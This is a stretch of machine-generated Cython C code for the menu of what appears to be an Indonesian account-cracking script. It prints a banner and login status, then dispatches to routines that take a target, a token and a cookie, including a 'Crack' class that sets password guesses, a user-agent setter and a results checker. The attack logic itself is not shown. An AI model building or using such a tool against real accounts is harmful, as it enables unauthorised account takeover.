  __Pyx_GIVEREF(__pyx_kp_u__2);
  PyTuple_SET_ITEM(__pyx_t_8, 0, __pyx_kp_u__2);
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_N); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 95, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_7 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 95, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_14 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) > __pyx_t_14) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) : __pyx_t_14;
  __pyx_t_13 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_7);
  __Pyx_GIVEREF(__pyx_t_7);
  PyTuple_SET_ITEM(__pyx_t_8, 1, __pyx_t_7);
  __pyx_t_7 = 0;
  __Pyx_INCREF(__pyx_kp_u_Author_Fall_Xavier_Dominic_Grem);
  __pyx_t_13 += 49;
  __Pyx_GIVEREF(__pyx_kp_u_Author_Fall_Xavier_Dominic_Grem);
  PyTuple_SET_ITEM(__pyx_t_8, 2, __pyx_kp_u_Author_Fall_Xavier_Dominic_Grem);
  __pyx_t_7 = __Pyx_PyUnicode_Join(__pyx_t_8, 3, __pyx_t_13, __pyx_t_14); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 95, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_8 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_7); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 95, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

  
  __pyx_t_8 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__3, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 96, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

  
  __pyx_t_8 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__5, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 97, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

  
  __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_hari_ini); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 98, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __pyx_t_7 = __Pyx_PyObject_FormatSimple(__pyx_t_8, __pyx_empty_unicode); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 98, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_8 = __Pyx_PyUnicode_Concat(__pyx_kp_u_Bergabung, __pyx_t_7); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 98, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_8); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 98, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

  
  __pyx_t_7 = PyTuple_New(4); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 99, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_13 = 0;
  __pyx_t_14 = 127;
  __Pyx_INCREF(__pyx_kp_u_Status);
  __pyx_t_13 += 19;
  __Pyx_GIVEREF(__pyx_kp_u_Status);
  PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_kp_u_Status);
  __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_H); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 99, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_8, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 99, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_14 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_14) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_14;
  __pyx_t_13 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_7, 1, __pyx_t_4);
  __pyx_t_4 = 0;
  __Pyx_INCREF(__pyx_n_u_Premium);
  __pyx_t_13 += 7;
  __Pyx_GIVEREF(__pyx_n_u_Premium);
  PyTuple_SET_ITEM(__pyx_t_7, 2, __pyx_n_u_Premium);
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_N); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 99, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_8 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 99, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_14 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) > __pyx_t_14) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) : __pyx_t_14;
  __pyx_t_13 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_8);
  __Pyx_GIVEREF(__pyx_t_8);
  PyTuple_SET_ITEM(__pyx_t_7, 3, __pyx_t_8);
  __pyx_t_8 = 0;
  __pyx_t_8 = __Pyx_PyUnicode_Join(__pyx_t_7, 4, __pyx_t_13, __pyx_t_14); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 99, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_8); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 99, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

  
  __pyx_t_7 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__5, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 100, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

  
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_ip); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 101, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_8 = __Pyx_PyObject_FormatSimple(__pyx_t_7, __pyx_empty_unicode); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 101, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyUnicode_Concat(__pyx_kp_u_IP, __pyx_t_8); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 101, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_8 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_7); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 101, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

  
  __pyx_t_8 = PyTuple_New(5); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 102, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __pyx_t_13 = 0;
  __pyx_t_14 = 127;
  __Pyx_INCREF(__pyx_kp_u_selamat_datang);
  __pyx_t_13 += 19;
  __Pyx_GIVEREF(__pyx_kp_u_selamat_datang);
  PyTuple_SET_ITEM(__pyx_t_8, 0, __pyx_kp_u_selamat_datang);
  __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_K); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 102, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_7, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 102, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_14 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_14) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_14;
  __pyx_t_13 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_8, 1, __pyx_t_4);
  __pyx_t_4 = 0;
  if (unlikely(!__pyx_v_nama)) { __Pyx_RaiseUnboundLocalError("nama"); __PYX_ERR(0, 102, __pyx_L1_error) }
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_v_nama, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 102, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_14 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_14) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_14;
  __pyx_t_13 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_8, 2, __pyx_t_4);
  __pyx_t_4 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_N); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 102, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_7 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 102, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_14 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) > __pyx_t_14) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) : __pyx_t_14;
  __pyx_t_13 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_7);
  __Pyx_GIVEREF(__pyx_t_7);
  PyTuple_SET_ITEM(__pyx_t_8, 3, __pyx_t_7);
  __pyx_t_7 = 0;
  __Pyx_INCREF(__pyx_kp_u__13);
  __pyx_t_13 += 3;
  __Pyx_GIVEREF(__pyx_kp_u__13);
  PyTuple_SET_ITEM(__pyx_t_8, 4, __pyx_kp_u__13);
  __pyx_t_7 = __Pyx_PyUnicode_Join(__pyx_t_8, 5, __pyx_t_13, __pyx_t_14); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 102, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_8 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_7); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 102, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

  
  __pyx_t_8 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__14, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 103, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

  
  __pyx_t_8 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__15, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 104, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

  
  __pyx_t_8 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__16, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 105, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

  
  __pyx_t_8 = PyTuple_New(5); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 106, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __pyx_t_13 = 0;
  __pyx_t_14 = 127;
  __Pyx_INCREF(__pyx_kp_u__17);
  __pyx_t_13 += 2;
  __Pyx_GIVEREF(__pyx_kp_u__17);
  PyTuple_SET_ITEM(__pyx_t_8, 0, __pyx_kp_u__17);
  __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_M); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 106, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_7, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 106, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_14 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_14) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_14;
  __pyx_t_13 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_8, 1, __pyx_t_4);
  __pyx_t_4 = 0;
  __Pyx_INCREF(__pyx_kp_u_00);
  __pyx_t_13 += 2;
  __Pyx_GIVEREF(__pyx_kp_u_00);
  PyTuple_SET_ITEM(__pyx_t_8, 2, __pyx_kp_u_00);
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_N); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 106, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_7 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 106, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_14 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) > __pyx_t_14) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) : __pyx_t_14;
  __pyx_t_13 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_7);
  __Pyx_GIVEREF(__pyx_t_7);
  PyTuple_SET_ITEM(__pyx_t_8, 3, __pyx_t_7);
  __pyx_t_7 = 0;
  __Pyx_INCREF(__pyx_kp_u_logout_hapus_login);
  __pyx_t_13 += 23;
  __Pyx_GIVEREF(__pyx_kp_u_logout_hapus_login);
  PyTuple_SET_ITEM(__pyx_t_8, 4, __pyx_kp_u_logout_hapus_login);
  __pyx_t_7 = __Pyx_PyUnicode_Join(__pyx_t_8, 5, __pyx_t_13, __pyx_t_14); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 106, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_8 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_7); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 106, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

  
  __pyx_t_8 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__18, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 107, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __pyx_v_ask = __pyx_t_8;
  __pyx_t_8 = 0;

  
  __Pyx_INCREF(__pyx_v_ask);
  __pyx_t_8 = __pyx_v_ask;
  __pyx_t_16 = (__Pyx_PyString_Equals(__pyx_t_8, __pyx_kp_s_1, Py_EQ)); if (unlikely(__pyx_t_16 < 0)) __PYX_ERR(0, 108, __pyx_L1_error)
  if (!__pyx_t_16) {
  } else {
    __pyx_t_15 = __pyx_t_16;
    goto __pyx_L28_bool_binop_done;
  }
  __pyx_t_16 = (__Pyx_PyString_Equals(__pyx_t_8, __pyx_kp_s_01, Py_EQ)); if (unlikely(__pyx_t_16 < 0)) __PYX_ERR(0, 108, __pyx_L1_error)
  __pyx_t_15 = __pyx_t_16;
  __pyx_L28_bool_binop_done:;
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_16 = (__pyx_t_15 != 0);
  if (__pyx_t_16) {

    
    __pyx_t_8 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__19, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 109, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

    
    __pyx_t_8 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__20, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 110, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __pyx_v_user = __pyx_t_8;
    __pyx_t_8 = 0;

    
    __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_publik); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 111, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    if (unlikely(!__pyx_v_token)) { __Pyx_RaiseUnboundLocalError("token"); __PYX_ERR(0, 111, __pyx_L1_error) }
    if (unlikely(!__pyx_v_cookie)) { __Pyx_RaiseUnboundLocalError("cookie"); __PYX_ERR(0, 111, __pyx_L1_error) }
    __pyx_t_4 = NULL;
    __pyx_t_17 = 0;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
      __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_7);
      if (likely(__pyx_t_4)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
        __Pyx_INCREF(__pyx_t_4);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_7, function);
        __pyx_t_17 = 1;
      }
    }
    #if CYTHON_FAST_PYCALL
    if (PyFunction_Check(__pyx_t_7)) {
      PyObject *__pyx_temp[5] = {__pyx_t_4, __pyx_v_user, __pyx_kp_s__21, __pyx_v_token, __pyx_v_cookie};
      __pyx_t_8 = __Pyx_PyFunction_FastCall(__pyx_t_7, __pyx_temp+1-__pyx_t_17, 4+__pyx_t_17); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 111, __pyx_L1_error)
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_GOTREF(__pyx_t_8);
    } else
    #endif
    #if CYTHON_FAST_PYCCALL
    if (__Pyx_PyFastCFunction_Check(__pyx_t_7)) {
      PyObject *__pyx_temp[5] = {__pyx_t_4, __pyx_v_user, __pyx_kp_s__21, __pyx_v_token, __pyx_v_cookie};
      __pyx_t_8 = __Pyx_PyCFunction_FastCall(__pyx_t_7, __pyx_temp+1-__pyx_t_17, 4+__pyx_t_17); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 111, __pyx_L1_error)
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_GOTREF(__pyx_t_8);
    } else
    #endif
    {
      __pyx_t_5 = PyTuple_New(4+__pyx_t_17); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 111, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      if (__pyx_t_4) {
        __Pyx_GIVEREF(__pyx_t_4); PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_t_4); __pyx_t_4 = NULL;
      }
      __Pyx_INCREF(__pyx_v_user);
      __Pyx_GIVEREF(__pyx_v_user);
      PyTuple_SET_ITEM(__pyx_t_5, 0+__pyx_t_17, __pyx_v_user);
      __Pyx_INCREF(__pyx_kp_s__21);
      __Pyx_GIVEREF(__pyx_kp_s__21);
      PyTuple_SET_ITEM(__pyx_t_5, 1+__pyx_t_17, __pyx_kp_s__21);
      __Pyx_INCREF(__pyx_v_token);
      __Pyx_GIVEREF(__pyx_v_token);
      PyTuple_SET_ITEM(__pyx_t_5, 2+__pyx_t_17, __pyx_v_token);
      __Pyx_INCREF(__pyx_v_cookie);
      __Pyx_GIVEREF(__pyx_v_cookie);
      PyTuple_SET_ITEM(__pyx_t_5, 3+__pyx_t_17, __pyx_v_cookie);
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_t_5, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 111, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    }
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_Crack); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 112, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_4 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
      __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_5);
      if (likely(__pyx_t_4)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
        __Pyx_INCREF(__pyx_t_4);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_5, function);
      }
    }
    __pyx_t_7 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 112, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_atursandi); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 112, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_7 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
      __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_5);
      if (likely(__pyx_t_7)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
        __Pyx_INCREF(__pyx_t_7);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_5, function);
      }
    }
    __pyx_t_8 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 112, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

    
    goto __pyx_L27;
  }

  
  __Pyx_INCREF(__pyx_v_ask);
  __pyx_t_8 = __pyx_v_ask;
  __pyx_t_15 = (__Pyx_PyString_Equals(__pyx_t_8, __pyx_kp_s_2, Py_EQ)); if (unlikely(__pyx_t_15 < 0)) __PYX_ERR(0, 113, __pyx_L1_error)
  if (!__pyx_t_15) {
  } else {
    __pyx_t_16 = __pyx_t_15;
    goto __pyx_L30_bool_binop_done;
  }
  __pyx_t_15 = (__Pyx_PyString_Equals(__pyx_t_8, __pyx_kp_s_02, Py_EQ)); if (unlikely(__pyx_t_15 < 0)) __PYX_ERR(0, 113, __pyx_L1_error)
  __pyx_t_16 = __pyx_t_15;
  __pyx_L30_bool_binop_done:;
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_15 = (__pyx_t_16 != 0);
  if (__pyx_t_15) {

    
    __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_set_ugent); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 114, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_7 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
      __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_5);
      if (likely(__pyx_t_7)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
        __Pyx_INCREF(__pyx_t_7);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_5, function);
      }
    }
    __pyx_t_8 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 114, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

    
    goto __pyx_L27;
  }

  
  __Pyx_INCREF(__pyx_v_ask);
  __pyx_t_8 = __pyx_v_ask;
  __pyx_t_16 = (__Pyx_PyString_Equals(__pyx_t_8, __pyx_kp_s_3, Py_EQ)); if (unlikely(__pyx_t_16 < 0)) __PYX_ERR(0, 115, __pyx_L1_error)
  if (!__pyx_t_16) {
  } else {
    __pyx_t_15 = __pyx_t_16;
    goto __pyx_L32_bool_binop_done;
  }
  __pyx_t_16 = (__Pyx_PyString_Equals(__pyx_t_8, __pyx_kp_s_03, Py_EQ)); if (unlikely(__pyx_t_16 < 0)) __PYX_ERR(0, 115, __pyx_L1_error)
  __pyx_t_15 = __pyx_t_16;
  __pyx_L32_bool_binop_done:;
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_16 = (__pyx_t_15 != 0);
  if (__pyx_t_16) {

    
    __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_cek_result); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 116, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_7 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
      __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_5);
      if (likely(__pyx_t_7)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
        __Pyx_INCREF(__pyx_t_7);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_5, function);
      }
    }
    __pyx_t_8 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 116, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

    
    goto __pyx_L27;
  }

  
  __Pyx_INCREF(__pyx_v_ask);
  __pyx_t_8 = __pyx_v_ask;
  __pyx_t_15 = (__Pyx_PyString_Equals(__pyx_t_8, __pyx_kp_s_0, Py_EQ)); if (unlikely(__pyx_t_15 < 0)) __PYX_ERR(0, 117, __pyx_L1_error)
  if (!__pyx_t_15) {
  } else {
    __pyx_t_16 = __pyx_t_15;
    goto __pyx_L34_bool_binop_done;
  }
